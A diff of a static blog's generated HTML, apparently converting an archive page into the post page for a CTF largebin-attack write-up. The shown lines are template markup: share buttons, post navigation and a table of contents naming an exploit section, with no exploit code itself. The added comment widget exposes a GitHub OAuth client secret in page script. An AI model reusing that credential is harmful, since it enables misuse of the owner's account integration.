+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/18/largebin_attack/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/27/unlink/" class="archive-article-date">
-  	<time datetime="2018-05-27T05:10:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-27</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2019/04/18/DDCTF2019/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          DDCTF 2019
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/26/RFID/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RFID 安全初探</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/27/unlink/">堆溢出之 double free 及 unlink</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#西湖论剑-2019-Storm-note"><span class="toc-number">1.</span> <span class="toc-text">西湖论剑 2019 Storm_note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-largebin"><span class="toc-number">2.</span> <span class="toc-text">What is largebin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用思路分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用思路分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整-EXP"><span class="toc-number">4.</span> <span class="toc-text">完整 EXP</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/09/格式化字符串漏洞/" class="archive-article-date">
-  	<time datetime="2018-04-08T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/09/格式化字符串漏洞/">栈溢出之 格式化字符串漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/06/angr深入理解/" class="archive-article-date">
-  	<time datetime="2018-04-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-06</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/06/angr深入理解/">angr深入理解1–CLE装载器和angr.Project</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/angr//" class="article-tag-list-link color5">angr</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/04/angr框架初探/" class="archive-article-date">
-  	<time datetime="2018-04-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/04/angr框架初探/">angr框架初探</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/angr//" class="article-tag-list-link color5">angr</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/03/爬虫/" class="archive-article-date">
-  	<time datetime="2018-04-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/03/爬虫/">第一个爬虫--爬取OJ代码(SDUSTOJ外网)</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/爬虫//" class="article-tag-list-link color3">爬虫</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/02/ROP/" class="archive-article-date">
-  	<time datetime="2018-04-02T03:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/02/ROP/">栈溢出之ROP</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/20/GiWiFi-crack/" class="archive-article-date">
-  	<time datetime="2018-03-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/20/GiWiFi-crack/">免费使用 GiWiFi ？</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/19/pwnable-kr-passcodeWP/" class="archive-article-date">
-  	<time datetime="2018-03-19T08:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/19/pwnable-kr-passcodeWP/">栈溢出之 hijack GOT</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/16/Python3-x总结/" class="archive-article-date">
-  	<time datetime="2018-03-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/16/Python3-x总结/">Python3.x基础总结</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/4/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><span class="page-number current">5</span>
-    </nav>
+  <div id="gitment-ctn"></div> 
+<link rel="stylesheet" href="https://billts.site/extra_css/gitment.css">
+<script src="https://billts.site/js/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+  id: "http://yoursite.com/2019/04/18/largebin_attack/",
+  owner: 'rrrrrrri',
+  repo: 'rrrrrrri.github.io',
+  oauth: {
+    client_id: 'b02ae2fd83142bce4350',
+    client_secret: 'dad31d4a347d05c4f146be764e2848dc72cbd576',
+  },
+})
+gitment.render('gitment-ctn')
+</script>
   
 
 
@@ -508,8 +476,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
